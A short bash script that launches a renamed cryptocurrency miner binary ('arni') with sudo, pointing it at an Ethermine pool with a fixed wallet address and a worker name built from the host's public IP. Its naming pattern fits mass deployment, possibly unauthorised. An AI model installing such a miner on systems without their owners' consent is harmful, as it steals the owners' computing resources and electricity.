#!/bin/bash

POOL=ssl://eu1.ethermine.org:5555
WALLET=0xd55795122ef8019c1ea32c22c185e6f4925c91bf.$(echo "$(curl -s ifconfig.me)" | tr . _ )-chung

cd "$(dirname "$0")"

chmod +x ./arni && sudo ./arni -pool $POOL -wal $WALLET $@ -pass x -proto 3 -stales 0
